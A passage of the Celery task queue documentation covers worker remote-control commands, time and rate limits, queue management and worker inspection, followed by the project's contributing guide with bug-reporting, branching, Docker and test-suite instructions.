`` `pycon     >> app.control.revoke_by_stamped_header({     ...    'header_A': 'value_1',     ...    'header_B': ['value_2', 'value_3'],     })  This will revoke all of the tasks that have a stamped header ``header\_A`with value`value\_1`,`<span class="title-ref"> and all of the tasks that have a stamped header </span><span class="title-ref">header\_B</span><span class="title-ref"> with values </span><span class="title-ref">value\_2</span><span class="title-ref"> or </span><span class="title-ref">value\_3</span>\`.

**CLI Example**

`` `console     $ celery -A proj control revoke_by_stamped_header stamped_header_key_A=stamped_header_value_1 stamped_header_key_B=stamped_header_value_2      $ celery -A proj control revoke_by_stamped_header stamped_header_key_A=stamped_header_value_1 stamped_header_key_B=stamped_header_value_2 --terminate      $ celery -A proj control revoke_by_stamped_header stamped_header_key_A=stamped_header_value_1 stamped_header_key_B=stamped_header_value_2 --terminate --signal=SIGKILL  .. _worker-time-limits:  Time Limits ``\` ===========

<div class="versionadded">

2.0

</div>

  - pool support  
    *prefork/gevent (see note below)*

<div class="sidebar">

**Soft, or hard?**

The time limit is set in two values, <span class="title-ref">soft</span> and <span class="title-ref">hard</span>. The soft time limit allows the task to catch an exception to clean up before it is killed: the hard timeout isn't catch-able and force terminates the task.

</div>

A single task can potentially run forever, if you have lots of tasks waiting for some event that'll never happen you'll block the worker from processing new tasks indefinitely. The best way to defend against this scenario happening is enabling time limits.

The time limit (<span class="title-ref">--time-limit</span>) is the maximum number of seconds a task may run before the process executing it is terminated and replaced by a new process. You can also enable a soft time limit (<span class="title-ref">--soft-time-limit</span>), this raises an exception the task can catch to clean up before the hard time limit kills it:

`` `python     from myapp import app     from celery.exceptions import SoftTimeLimitExceeded      @app.task     def mytask():         try:             do_work()         except SoftTimeLimitExceeded:             clean_up_in_a_hurry()  Time limits can also be set using the :setting:`task_time_limit` / ``<span class="title-ref"> :setting:\`task\_soft\_time\_limit</span> settings. You can also specify time limits for client side operation using `timeout` argument of `AsyncResult.get()` function.

\> **Note** \> Time limits don't currently work on platforms that don't support the `SIGUSR1` signal.

<div class="note">

<div class="title">

Note

</div>

The gevent pool does not implement soft time limits. Additionally, it will not enforce the hard time limit if the task is blocking.

</div>

#### Changing time limits at run-time

<div class="versionadded">

2.3

</div>

  - broker support  
    *amqp, redis*

There's a remote control command that enables you to change both soft and hard time limits for a task — named `time_limit`.

Example changing the time limit for the `tasks.crawl_the_web` task to have a soft time limit of one minute, and a hard time limit of two minutes:

`` `pycon     >>> app.control.time_limit('tasks.crawl_the_web',                                soft=60, hard=120, reply=True)     [{'worker1.example.com': {'ok': 'time limits set successfully'}}]  Only tasks that starts executing after the time limit change will be affected.  .. _worker-rate-limits:  Rate Limits ``\` ===========

<div class="control">

rate\_limit

</div>

#### Changing rate-limits at run-time

Example changing the rate limit for the <span class="title-ref">myapp.mytask</span> task to execute at most 200 tasks of that type every minute:

`` `pycon     >>> app.control.rate_limit('myapp.mytask', '200/m')  The above doesn't specify a destination, so the change request will affect ``<span class="title-ref"> all worker instances in the cluster. If you only want to affect a specific list of workers you can include the </span><span class="title-ref">destination</span>\` argument:

`` `pycon     >>> app.control.rate_limit('myapp.mytask', '200/m',     ...            destination=['celery@worker1.example.com'])  > **Warning** >      This won't affect workers with the     :setting:`worker_disable_rate_limits` setting enabled.  .. _worker-max-tasks-per-child:  Max tasks per child setting ``\` ===========================

<div class="versionadded">

2.0

</div>

  - pool support  
    *prefork*

With this option you can configure the maximum number of tasks a worker can execute before it's replaced by a new process.

This is useful if you have memory leaks you have no control over for example from closed source C extensions.

The option can be set using the workers `--max-tasks-per-child <celery worker --max-tasks-per-child>` argument or using the `worker_max_tasks_per_child` setting.

## Max memory per child setting

<div class="versionadded">

4.0

</div>

  - pool support  
    *prefork*

With this option you can configure the maximum amount of resident memory a worker can execute before it's replaced by a new process.

This is useful if you have memory leaks you have no control over for example from closed source C extensions.

The option can be set using the workers `--max-memory-per-child <celery worker --max-memory-per-child>` argument or using the `worker_max_memory_per_child` setting.

## Autoscaling

<div class="versionadded">

2.2

</div>

  - pool support  
    *prefork*, *gevent*

The *autoscaler* component is used to dynamically resize the pool based on load:

  -   - The autoscaler adds more pool processes when there is work to do,
        
          - and starts removing processes when the workload is low.

It's enabled by the `--autoscale <celery worker --autoscale>` option, which needs two numbers: the maximum and minimum number of pool processes:

`` `text         --autoscale=AUTOSCALE              Enable autoscaling by providing              max_concurrency,min_concurrency.  Example:                --autoscale=10,3 (always keep 3 processes, but grow to               10 if necessary).  You can also define your own rules for the autoscaler by subclassing ``<span class="title-ref"> </span>\~celery.worker.autoscale.Autoscaler\`. Some ideas for metrics include load average or the amount of memory available. You can specify a custom autoscaler with the `worker_autoscaler` setting.

## Queues

A worker instance can consume from any number of queues. By default it will consume from all queues defined in the `task_queues` setting (that if not specified falls back to the default queue named `celery`).

You can specify what queues to consume from at start-up, by giving a comma separated list of queues to the `-Q <celery worker -Q>` option:

`` `console     $ celery -A proj worker -l INFO -Q foo,bar,baz  If the queue name is defined in :setting:`task_queues` it will use that ``<span class="title-ref"> configuration, but if it's not defined in the list of queues Celery will automatically generate a new queue for you (depending on the :setting:\`task\_create\_missing\_queues</span> option).

You can also tell the worker to start and stop consuming from a queue at run-time using the remote control commands `add_consumer` and `cancel_consumer`.

<div class="control">

add\_consumer

</div>

#### Queues: Adding consumers

The `add_consumer` control command will tell one or more workers to start consuming from a queue. This operation is idempotent.

To tell all workers in the cluster to start consuming from a queue named "`foo`" you can use the `celery control` program:

`` `console     $ celery -A proj control add_consumer foo     -> worker1.local: OK         started consuming from u'foo'  If you want to specify a specific worker you can use the ``<span class="title-ref"> :option:</span>--destination \<celery control --destination\>\` argument:

`` `console     $ celery -A proj control add_consumer foo -d celery@worker1.local  The same can be accomplished dynamically using the `@control.add_consumer` method:  .. code-block:: pycon      >>> app.control.add_consumer('foo', reply=True)     [{u'worker1.local': {u'ok': u"already consuming from u'foo'"}}]      >>> app.control.add_consumer('foo', reply=True,     ...                          destination=['worker1@example.com'])     [{u'worker1.local': {u'ok': u"already consuming from u'foo'"}}]   By now we've only shown examples using automatic queues, ``\` If you need more control you can also specify the exchange, routing\_key and even other options:

`` `pycon     >>> app.control.add_consumer(     ...     queue='baz',     ...     exchange='ex',     ...     exchange_type='topic',     ...     routing_key='media.*',     ...     options={     ...         'queue_durable': False,     ...         'exchange_durable': False,     ...     },     ...     reply=True,     ...     destination=['w1@example.com', 'w2@example.com'])   .. control:: cancel_consumer  Queues: Canceling consumers ``\` ---------------------------

You can cancel a consumer by queue name using the `cancel_consumer` control command.

To force all workers in the cluster to cancel consuming from a queue you can use the `celery control` program:

`` `console     $ celery -A proj control cancel_consumer foo  The :option:`--destination <celery control --destination>` argument can be ``\` used to specify a worker, or a list of workers, to act on the command:

`` `console     $ celery -A proj control cancel_consumer foo -d celery@worker1.local   You can also cancel consumers programmatically using the ``<span class="title-ref"> </span>@control.cancel\_consumer\` method:

`` `console     >>> app.control.cancel_consumer('foo', reply=True)     [{u'worker1.local': {u'ok': u"no longer consuming from u'foo'"}}]  .. control:: active_queues  Queues: List of active queues ``\` -----------------------------

You can get a list of queues that a worker consumes from by using the `active_queues` control command:

`` `console     $ celery -A proj inspect active_queues     [...]  Like all other remote control commands this also supports the ``<span class="title-ref"> :option:</span>--destination \<celery inspect --destination\>\` argument used to specify the workers that should reply to the request:

`` `console     $ celery -A proj inspect active_queues -d celery@worker1.local     [...]   This can also be done programmatically by using the ``<span class="title-ref"> </span>\~celery.app.control.Inspect.active\_queues\` method:

`` `pycon     >>> app.control.inspect().active_queues()     [...]      >>> app.control.inspect(['worker1.local']).active_queues()     [...]  .. _worker-inspect:  Inspecting workers ``\` ==================

<span class="title-ref">@control.inspect</span> lets you inspect running workers. It uses remote control commands under the hood.

You can also use the `celery` command to inspect workers, and it supports the same commands as the <span class="title-ref">@control</span> interface.

`` `pycon     >>> # Inspect all nodes.     >>> i = app.control.inspect()      >>> # Specify multiple nodes to inspect.     >>> i = app.control.inspect(['worker1.example.com',                                 'worker2.example.com'])      >>> # Specify a single node to inspect.     >>> i = app.control.inspect('worker1.example.com')  .. _worker-inspect-registered-tasks:  Dump of registered tasks ``\` ------------------------

You can get a list of tasks registered in the worker using the \`\~celery.app.control.Inspect.registered\`:

`` `pycon     >>> i.registered()     [{'worker1.example.com': ['tasks.add',                               'tasks.sleeptask']}]  .. _worker-inspect-active-tasks:  Dump of currently executing tasks ``\` ---------------------------------

You can get a list of active tasks using \`\~celery.app.control.Inspect.active\`:

`` `pycon     >>> i.active()     [{'worker1.example.com':         [{'name': 'tasks.sleeptask',           'id': '32666e9b-809c-41fa-8e93-5ae0c80afbbf',           'args': '(8,)',           'kwargs': '{}'}]}]  .. _worker-inspect-eta-schedule:  Dump of scheduled (ETA) tasks ``\` -----------------------------

You can get a list of tasks waiting to be scheduled by using \`\~celery.app.control.Inspect.scheduled\`:

`` `pycon     >>> i.scheduled()     [{'worker1.example.com':         [{'eta': '2010-06-07 09:07:52', 'priority': 0,           'request': {             'name': 'tasks.sleeptask',             'id': '1a7980ea-8b19-413e-91d2-0b74f3844c4d',             'args': '[1]',             'kwargs': '{}'}},          {'eta': '2010-06-07 09:07:53', 'priority': 0,           'request': {             'name': 'tasks.sleeptask',             'id': '49661b9a-aa22-4120-94b7-9ee8031d219d',             'args': '[2]',             'kwargs': '{}'}}]}]  > **Note** >      These are tasks with an ETA/countdown argument, not periodic tasks.  .. _worker-inspect-reserved:  Dump of reserved tasks ``\` ----------------------

Reserved tasks are tasks that have been received, but are still waiting to be executed.

You can get a list of these using \`\~celery.app.control.Inspect.reserved\`:

`` `pycon     >>> i.reserved()     [{'worker1.example.com':         [{'name': 'tasks.sleeptask',           'id': '32666e9b-809c-41fa-8e93-5ae0c80afbbf',           'args': '(8,)',           'kwargs': '{}'}]}]   .. _worker-statistics:  Statistics ``\` ----------

The remote control command `inspect stats` (or <span class="title-ref">\~celery.app.control.Inspect.stats</span>) will give you a long list of useful (or not so useful) statistics about the worker:

`` `console     $ celery -A proj inspect stats  For the output details, consult the reference documentation of `~celery.app.control.Inspect.stats`.  Additional Commands ``\` ===================

<div class="control">

shutdown

</div>

#### Remote shutdown

This command will gracefully shut down the worker remotely:

`` `pycon     >>> app.control.broadcast('shutdown') # shutdown all workers     >>> app.control.broadcast('shutdown', destination='worker1@example.com')  .. control:: ping  Ping ``\` ----

This command requests a ping from alive workers. The workers reply with the string 'pong', and that's just about it. It will use the default one second timeout for replies unless you specify a custom timeout:

`` `pycon     >>> app.control.ping(timeout=0.5)     [{'worker1.example.com': 'pong'},      {'worker2.example.com': 'pong'},      {'worker3.example.com': 'pong'}]  `~@control.ping` also supports the `destination` argument, ``\` so you can specify the workers to ping:

`` `pycon     >>> ping(['worker2.example.com', 'worker3.example.com'])     [{'worker2.example.com': 'pong'},      {'worker3.example.com': 'pong'}]  .. _worker-enable-events:  .. control:: enable_events ``\` .. control:: disable\_events

#### Enable/disable events

You can enable/disable events by using the <span class="title-ref">enable\_events</span>, <span class="title-ref">disable\_events</span> commands. This is useful to temporarily monitor a worker using `celery events`/`celerymon`.

`` `pycon     >>> app.control.enable_events()     >>> app.control.disable_events()  .. _worker-custom-control-commands:  Writing your own remote control commands ``\` ========================================

There are two types of remote control commands:

  - Inspect command
    
    > Does not have side effects, will usually just return some value found in the worker, like the list of currently registered tasks, the list of active tasks, etc.

  - Control command
    
    > Performs side effects, like adding a new queue to consume from.

Remote control commands are registered in the control panel and they take a single argument: the current <span class="title-ref">\!celery.worker.control.ControlDispatch</span> instance. From there you have access to the active <span class="title-ref">\~celery.worker.consumer.Consumer</span> if needed.

Here's an example control command that increments the task prefetch count:

`` `python     from celery.worker.control import control_command      @control_command(         args=[('n', int)],         signature='[N=1]',  # <- used for help on the command-line.     )     def increase_prefetch_count(state, n=1):         state.consumer.qos.increment_eventually(n)         return {'ok': 'prefetch count incremented'}  Make sure you add this code to a module that is imported by the worker: ``<span class="title-ref"> this could be the same module as where your Celery app is defined, or you can add the module to the :setting:\`imports</span> setting.

Restart the worker so that the control command is registered, and now you can call your command using the `celery control` utility:

`` `console     $ celery -A proj control increase_prefetch_count 3  You can also add actions to the :program:`celery inspect` program, ``\` for example one that reads the current prefetch count:

`` `python     from celery.worker.control import inspect_command      @inspect_command()     def current_prefetch_count(state):         return {'prefetch_count': state.consumer.qos.value}   After restarting the worker you can now query this value using the ``<span class="title-ref"> :program:\`celery inspect</span> program:

`` `console $ celery -A proj inspect current_prefetch_count ``\`

---

CONTRIBUTING.rst

---

Contributing
============

Welcome!

This document is fairly extensive and you aren\'t really expected to study this in detail for small contributions;

> The most important rule is that contributing must be easy and that the community is friendly and not nitpicking on details, such as coding style.

If you\'re reporting a bug you should read the Reporting bugs section below to ensure that your bug report contains enough information to successfully diagnose the issue, and if you\'re contributing code you should try to mimic the conventions you see surrounding the code you\'re working on, but in the end all patches will be cleaned up by the person merging the changes so don\'t worry too much.

::: {.contents local=""}
:::

Community Code of Conduct
-------------------------

The goal is to maintain a diverse community that\'s pleasant for everyone. That\'s why we would greatly appreciate it if everyone contributing to and interacting with the community also followed this Code of Conduct.

The Code of Conduct covers our behavior as members of the community, in any forum, mailing list, wiki, website, Internet relay chat (IRC), public meeting or private correspondence.

The Code of Conduct is heavily based on the [Ubuntu Code of Conduct](https://www.ubuntu.com/community/conduct), and the [Pylons Code of Conduct](https://pylonsproject.org/community-code-of-conduct.html).

### Be considerate

Your work will be used by other people, and you in turn will depend on the work of others. Any decision you take will affect users and colleagues, and we expect you to take those consequences into account when making decisions. Even if it\'s not obvious at the time, our contributions to Celery will impact the work of others. For example, changes to code, infrastructure, policy, documentation and translations during a release may negatively impact others\' work.

### Be respectful

The Celery community and its members treat one another with respect. Everyone can make a valuable contribution to Celery. We may not always agree, but disagreement is no excuse for poor behavior and poor manners. We might all experience some frustration now and then, but we cannot allow that frustration to turn into a personal attack. It\'s important to remember that a community where people feel uncomfortable or threatened isn\'t a productive one. We expect members of the Celery community to be respectful when dealing with other contributors as well as with people outside the Celery project and with users of Celery.

### Be collaborative

Collaboration is central to Celery and to the larger free software community. We should always be open to collaboration. Your work should be done transparently and patches from Celery should be given back to the community when they\'re made, not just when the distribution releases. If you wish to work on new code for existing upstream projects, at least keep those projects informed of your ideas and progress. It many not be possible to get consensus from upstream, or even from your colleagues about the correct implementation for an idea, so don\'t feel obliged to have that agreement before you begin, but at least keep the outside world informed of your work, and publish your work in a way that allows outsiders to test, discuss, and contribute to your efforts.

### When you disagree, consult others

Disagreements, both political and technical, happen all the time and the Celery community is no exception. It\'s important that we resolve disagreements and differing views constructively and with the help of the community and community process. If you really want to go a different way, then we encourage you to make a derivative distribution or alternate set of packages that still build on the work we\'ve done to utilize as common of a core as possible.

### When you\'re unsure, ask for help

Nobody knows everything, and nobody is expected to be perfect. Asking questions avoids many problems down the road, and so questions are encouraged. Those who are asked questions should be responsive and helpful. However, when asking a question, care must be taken to do so in an appropriate forum.

### Step down considerately

Developers on every project come and go and Celery is no different. When you leave or disengage from the project, in whole or in part, we ask that you do so in a way that minimizes disruption to the project. This means you should tell people you\'re leaving and take the proper steps to ensure that others can pick up where you left off.

Reporting Bugs
--------------

### Security {#vulnsec}

You must never report security related issues, vulnerabilities or bugs including sensitive information to the bug tracker, or elsewhere in public. Instead sensitive bugs must be sent by email to `security@celeryproject.org`.

If you\'d like to submit the information encrypted our PGP key is:

    -----BEGIN PGP PUBLIC KEY BLOCK-----
    Version: GnuPG v1.4.15 (Darwin)

    mQENBFJpWDkBCADFIc9/Fpgse4owLNvsTC7GYfnJL19XO0hnL99sPx+DPbfr+cSE
    9wiU+Wp2TfUX7pCLEGrODiEP6ZCZbgtiPgId+JYvMxpP6GXbjiIlHRw1EQNH8RlX
    cVxy3rQfVv8PGGiJuyBBjxzvETHW25htVAZ5TI1+CkxmuyyEYqgZN2fNd0wEU19D
    +c10G1gSECbCQTCbacLSzdpngAt1Gkrc96r7wGHBBSvDaGDD2pFSkVuTLMbIRrVp
    lnKOPMsUijiip2EMr2DvfuXiUIUvaqInTPNWkDynLoh69ib5xC19CSVLONjkKBsr
    Pe+qAY29liBatatpXsydY7GIUzyBT3MzgMJlABEBAAG0MUNlbGVyeSBTZWN1cml0
    eSBUZWFtIDxzZWN1cml0eUBjZWxlcnlwcm9qZWN0Lm9yZz6JATgEEwECACIFAlJp
    WDkCGwMGCwkIBwMCBhUIAgkKCwQWAgMBAh4BAheAAAoJEOArFOUDCicIw1IH/26f
    CViDC7/P13jr+srRdjAsWvQztia9HmTlY8cUnbmkR9w6b6j3F2ayw8VhkyFWgYEJ
    wtPBv8mHKADiVSFARS+0yGsfCkia5wDSQuIv6XqRlIrXUyqJbmF4NUFTyCZYoh+C
    ZiQpN9xGhFPr5QDlMx2izWg1rvWlG1jY2Es1v/xED3AeCOB1eUGvRe/uJHKjGv7J
    rj0pFcptZX+WDF22AN235WYwgJM6TrNfSu8sv8vNAQOVnsKcgsqhuwomSGsOfMQj
    LFzIn95MKBBU1G5wOs7JtwiV9jefGqJGBO2FAvOVbvPdK/saSnB+7K36dQcIHqms
    5hU4Xj0RIJiod5idlRC5AQ0EUmlYOQEIAJs8OwHMkrdcvy9kk2HBVbdqhgAREMKy
    gmphDp7prRL9FqSY/dKpCbG0u82zyJypdb7QiaQ5pfPzPpQcd2dIcohkkh7G3E+e
    hS2L9AXHpwR26/PzMBXyr2iNnNc4vTksHvGVDxzFnRpka6vbI/hrrZmYNYh9EAiv
    uhE54b3/XhXwFgHjZXb9i8hgJ3nsO0pRwvUAM1bRGMbvf8e9F+kqgV0yWYNnh6QL
    4Vpl1+epqp2RKPHyNQftbQyrAHXT9kQF9pPlx013MKYaFTADscuAp4T3dy7xmiwS
    crqMbZLzfrxfFOsNxTUGE5vmJCcm+mybAtRo4aV6ACohAO9NevMx8pUAEQEAAYkB
    HwQYAQIACQUCUmlYOQIbDAAKCRDgKxTlAwonCNFbB/9esir/f7TufE+isNqErzR/
    aZKZo2WzZR9c75kbqo6J6DYuUHe6xI0OZ2qZ60iABDEZAiNXGulysFLCiPdatQ8x
    8zt3DF9BMkEck54ZvAjpNSern6zfZb1jPYWZq3TKxlTs/GuCgBAuV4i5vDTZ7xK/
    aF+OFY5zN7ciZHkqLgMiTZ+RhqRcK6FhVBP/Y7d9NlBOcDBTxxE1ZO1ute6n7guJ
    ciw4hfoRk8qNN19szZuq3UU64zpkM2sBsIFM9tGF2FADRxiOaOWZHmIyVZriPFqW
    RUwjSjs7jBVNq0Vy4fCu/5+e+XLOUBOoqtM5W7ELt0t1w9tXebtPEetV86in8fU2
    =0chn
    -----END PGP PUBLIC KEY BLOCK-----

### Other bugs

Bugs can always be described to the `mailing-list`{.interpreted-text role="ref"}, but the best way to report an issue and to ensure a timely response is to use the issue tracker.

1)  **Create a GitHub account**.

You need to [create a GitHub account](https://github.com/signup/free) to be able to create new issues and participate in the discussion.

2)  **Determine if your bug is really a bug**.

You shouldn\'t file a bug if you\'re requesting support. For that you can use the `mailing-list`{.interpreted-text role="ref"}, or `irc-channel`{.interpreted-text role="ref"}. If you still need support you can open a github issue, please prepend the title with `[QUESTION]`.

3)  **Make sure your bug hasn\'t already been reported**.

Search through the appropriate Issue tracker. If a bug like yours was found, check if you have new information that could be reported to help the developers fix the bug.

4)  **Check if you\'re using the latest version**.

A bug could be fixed by some other improvements and fixes - it might not have an existing report in the bug tracker. Make sure you\'re using the latest releases of celery, billiard, kombu, amqp, and vine.

5)  **Collect information about the bug**.

To have the best chance of having a bug fixed, we need to be able to easily reproduce the conditions that caused it. Most of the time this information will be from a Python traceback message, though some bugs might be in design, spelling or other errors on the website/docs/code.

> A)  If the error is from a Python traceback, include it in the bug report.
>
> B)  We also need to know what platform you\'re running (Windows, macOS, Linux, etc.), the version of your Python interpreter, and the version of Celery, and related packages that you were running when the bug occurred.
>
> C)  If you\'re reporting a race condition or a deadlock, tracebacks can be hard to get or might not be that useful. Try to inspect the process to get more diagnostic data. Some ideas:
>
>     -   Enable Celery\'s `breakpoint signal <breakpoint_signal>`{.interpreted-text role="ref"} and use it to inspect the process\'s state. This will allow you to open a `pdb`{.interpreted-text role="mod"} session.
>     -   Collect tracing data using [strace](https://en.wikipedia.org/wiki/Strace)(Linux), `dtruss`{.interpreted-text role="command"} (macOS), and `ktrace`{.interpreted-text role="command"} (BSD), [ltrace](https://en.wikipedia.org/wiki/Ltrace), and [lsof](https://en.wikipedia.org/wiki/Lsof).
>
> D)  Include the output from the `celery report`{.interpreted-text role="command"} command:
>
>     > ``` {.console}
>     > $ celery -A proj report
>     > ```
>     >
>     > This will also include your configuration settings and it will try to remove values for keys known to be sensitive, but make sure you also verify the information before submitting so that it doesn\'t contain confidential information like API tokens and authentication credentials.
>
> E)  Your issue might be tagged as [Needs Test Case]{.title-ref}. A test case represents all the details needed to reproduce what your issue is reporting. A test case can be some minimal code that reproduces the issue or detailed instructions and configuration values that reproduces said issue.

6)  **Submit the bug**.

By default [GitHub](https://github.com) will email you to let you know when new comments have been made on your bug. In the event you\'ve turned this feature off, you should check back on occasion to ensure you don\'t miss any questions a developer trying to fix the bug might ask.

### Issue Trackers

Bugs for a package in the Celery ecosystem should be reported to the relevant issue tracker.

-   `celery`{.interpreted-text role="pypi"}: <https://github.com/celery/celery/issues/>
-   `kombu`{.interpreted-text role="pypi"}: <https://github.com/celery/kombu/issues>
-   `amqp`{.interpreted-text role="pypi"}: <https://github.com/celery/py-amqp/issues>
-   `vine`{.interpreted-text role="pypi"}: <https://github.com/celery/vine/issues>
-   `pytest-celery`{.interpreted-text role="pypi"}: <https://github.com/celery/pytest-celery/issues>
-   `librabbitmq`{.interpreted-text role="pypi"}: <https://github.com/celery/librabbitmq/issues>
-   `django-celery-beat`{.interpreted-text role="pypi"}: <https://github.com/celery/django-celery-beat/issues>
-   `django-celery-results`{.interpreted-text role="pypi"}: <https://github.com/celery/django-celery-results/issues>

If you\'re unsure of the origin of the bug you can ask the `mailing-list`{.interpreted-text role="ref"}, or just use the Celery issue tracker.

Contributors guide to the code base
-----------------------------------

There\'s a separate section for internal details, including details about the code base and a style guide.

Read `internals-guide`{.interpreted-text role="ref"} for more!

Versions
--------

Version numbers consists of a major version, minor version and a release number. Since version 2.1.0 we use the versioning semantics described by SemVer: <http://semver.org>.

Stable releases are published at PyPI while development releases are only available in the GitHub git repository as tags. All version tags starts with "v", so version 0.8.0 has the tag v0.8.0.

Branches {#git-branches}
--------

Current active version branches:

-   dev (which git calls \"main\") (<https://github.com/celery/celery/tree/main>)
-   4.5 (<https://github.com/celery/celery/tree/v4.5>)
-   3.1 (<https://github.com/celery/celery/tree/3.1>)

You can see the state of any branch by looking at the Changelog:

> <https://github.com/celery/celery/blob/main/Changelog.rst>

If the branch is in active development the topmost version info should contain meta-data like:

``` {.restructuredtext}
4.3.0
======
:release-date: TBA
:status: DEVELOPMENT
:branch: dev (git calls this main)
```

The `status` field can be one of:

-   `PLANNING`

    > The branch is currently experimental and in the planning stage.

-   `DEVELOPMENT`

    > The branch is in active development, but the test suite should be passing and the product should be working and possible for users to test.

-   `FROZEN`

    > The branch is frozen, and no more features will be accepted. When a branch is frozen the focus is on testing the version as much as possible before it is released.

### dev branch

The dev branch (called \"main\" by git), is where development of the next version happens.

### Maintenance branches

Maintenance branches are named after the version \-- for example, the maintenance branch for the 2.2.x series is named `2.2`.

Previously these were named `releaseXX-maint`.

The versions we currently maintain is:

-   4.2

    This is the current series.

-   4.1

    Drop support for python 2.6. Add support for python 3.4, 3.5 and 3.6.

-   3.1

    Official support for python 2.6, 2.7 and 3.3, and also supported on PyPy.

### Archived branches

Archived branches are kept for preserving history only, and theoretically someone could provide patches for these if they depend on a series that\'s no longer officially supported.

An archived version is named `X.Y-archived`.

To maintain a cleaner history and drop compatibility to continue improving the project, we **do not have any archived version** right now.

### Feature branches

Major new features are worked on in dedicated branches. There\'s no strict naming requirement for these branches.

Feature branches are removed once they\'ve been merged into a release branch.

Tags
----

-   Tags are used exclusively for tagging releases. A release tag is named with the format `vX.Y.Z` \-- for example `v2.3.1`.
-   Experimental releases contain an additional identifier `vX.Y.Z-id` \--for example `v3.0.0-rc1`.
-   Experimental tags may be removed after the official release.

Working on Features & Patches {#contributing-changes}
-----------------------------

::: {.note}
::: {.title}
Note
:::

Contributing to Celery should be as simple as possible, so none of these steps should be considered mandatory.

You can even send in patches by email if that\'s your preferred work method. We won\'t like you any less, any contribution you make is always appreciated!

However, following these steps may make maintainer\'s life easier, and may mean that your changes will be accepted sooner.
:::

### Forking and setting up the repository

First you need to fork the Celery repository; a good introduction to this is in the GitHub Guide: [Fork a Repo](https://help.github.com/fork-a-repo/).

After you have cloned the repository, you should checkout your copy to a directory on your machine:

``` {.console}
$ git clone git@github.com:username/celery.git
```

When the repository is cloned, enter the directory to set up easy access to upstream changes:

``` {.console}
$ cd celery
$ git remote add upstream git@github.com:celery/celery.git
$ git fetch upstream
```

If you need to pull in new changes from upstream you should always use the `--rebase` option to `git pull`:

``` {.console}
git pull --rebase upstream main
```

With this option, you don\'t clutter the history with merging commit notes. See [Rebasing merge commits in git](https://web.archive.org/web/20150627054345/http://marketblog.envato.com/general/rebasing-merge-commits-in-git/). If you want to learn more about rebasing, see the [Rebase](https://help.github.com/rebase/) section in the GitHub guides.

If you need to work on a different branch than the one git calls `main`, you can fetch and checkout a remote branch like this:

    git checkout --track -b 5.0-devel upstream/5.0-devel

**Note:** Any feature or fix branch should be created from `upstream/main`.

### Developing and Testing with Docker {#contributing-docker-development}

Because of the many components of Celery, such as a broker and backend, [Docker](https://www.docker.com/) and [docker-compose](https://docs.docker.com/compose/) can be utilized to greatly simplify the development and testing cycle. The Docker configuration here requires a Docker version of at least 17.13.0 and [docker-compose]{.title-ref} 1.13.0+.

The Docker components can be found within the `docker/`{.interpreted-text role="file"} folder and the Docker image can be built via:

``` {.console}
$ docker compose build celery
```

and run via:

``` {.console}
$ docker compose run --rm celery <command>
```

where \<command\> is a command to execute in a Docker container. The [\--rm]{.title-ref} flag indicates that the container should be removed after it is exited and is useful to prevent accumulation of unwanted containers.

Some useful commands to run:

-   `bash`

    > To enter the Docker container like a normal shell

-   `make test`

    > To run the test suite. **Note:** This will run tests using python 3.12 by default.

-   `tox`

    > To run tox and test against a variety of configurations. **Note:** This command will run tests for every environment defined in `tox.ini`{.interpreted-text role="file"}. It takes a while.

-   `pyenv exec python{3.8,3.9,3.10,3.11,3.12} -m pytest t/unit`

    > To run unit tests using pytest.
    >
    > **Note:** `{3.8,3.9,3.10,3.11,3.12}` means you can use any of those options. e.g. `pyenv exec python3.12 -m pytest t/unit`

-   `pyenv exec python{3.8,3.9,3.10,3.11,3.12} -m pytest t/integration`

    > To run integration tests using pytest
    >
    > **Note:** `{3.8,3.9,3.10,3.11,3.12}` means you can use any of those options. e.g. `pyenv exec python3.12 -m pytest t/unit`

By default, docker-compose will mount the Celery and test folders in the Docker container, allowing code changes and testing to be immediately visible inside the Docker container. Environment variables, such as the broker and backend to use are also defined in the `docker/docker-compose.yml`{.interpreted-text role="file"} file.

By running `docker compose build celery` an image will be created with the name `celery/celery:dev`. This docker image has every dependency needed for development installed. `pyenv` is used to install multiple python versions, the docker image offers python 3.8, 3.9, 3.10, 3.11 and 3.12. The default python version is set to 3.12.

The `docker-compose.yml`{.interpreted-text role="file"} file defines the necessary environment variables to run integration tests. The `celery` service also mounts the codebase and sets the `PYTHONPATH` environment variable to `/home/developer/celery`. By setting `PYTHONPATH` the service allows to use the mounted codebase as global module for development. If you prefer, you can also run `python -m pip install -e .` to install the codebase in development mode.

If you would like to run a Django or stand alone project to manually test or debug a feature, you can use the image built by [docker compose]{.title-ref} and mount your custom code. Here\'s an example:

Assuming a folder structure such as:

``` {.console}
+ celery_project
  + celery # repository cloned here.
  + my_project
    - manage.py
    + my_project
      - views.py
```

``` {.yaml}
version: "3"

services:
    celery:
        image: celery/celery:dev
        environment:
            TEST_BROKER: amqp://rabbit:5672
            TEST_BACKEND: redis://redis
         volumes:
             - ../../celery:/home/developer/celery
             - ../my_project:/home/developer/my_project
         depends_on:
             - rabbit
             - redis
     rabbit:
         image: rabbitmq:latest
     redis:
         image: redis:latest
```

In the previous example, we are using the image that we can build from this repository and mounting the celery code base as well as our custom project.

### Running the unit test suite {#contributing-testing}

If you like to develop using virtual environments or just outside docker, you must make sure all necessary dependencies are installed. There are multiple requirements files to make it easier to install all dependencies. You do not have to use every requirements file but you must use [default.txt]{.title-ref}.

``` {.console}
# pip install -U -r requirements/default.txt
```

To run the Celery test suite you need to install `requirements/test.txt`{.interpreted-text role="file"}.

``` {.console}
$ pip install -U -r requirements/test.txt
$ pip install -U -r requirements/default.txt
```

After installing the dependencies required, you can now execute the test suite by calling `pytest <pytest>`{.interpreted-text role="pypi"}:

``` {.console}
$ pytest t/unit
$ pytest t/integration
```

Some useful options to `pytest`{.interpreted-text role="command"} are:

-   `-x`

    > Stop running the tests at the first test that fails.

-   `-s`

    > Don\'t capture output

-   `-v`

    > Run with verbose output.

If you want to run the tests for a single test file only you can do so like this:

``` {.console}
$ pytest t/unit/worker/test_worker.py
```

#### Calculating test coverage {#contributing-coverage}

To calculate test coverage you must first install the `pytest-cov`{.interpreted-text role="pypi"} module.

Installing the `pytest-cov`{.interpreted-text role="pypi"} module:

``` {.console}
$ pip install -U pytest-cov
```

##### Code coverage in HTML format

1.  Run `pytest`{.interpreted-text role="command"} with the `--cov-report=html` argument enabled:

    > ``` {.console}
    > $ pytest --cov=celery --cov-report=html
    > ```

2.  The coverage output will then be located in the `htmlcov/`{.interpreted-text role="file"} directory:

    > ``` {.console}
    > $ open htmlcov/index.html
    > ```

##### Code coverage in XML (Cobertura-style)

1.  Run `pytest`{.interpreted-text role="command"} with the `--cov-report=xml` argument enabled:

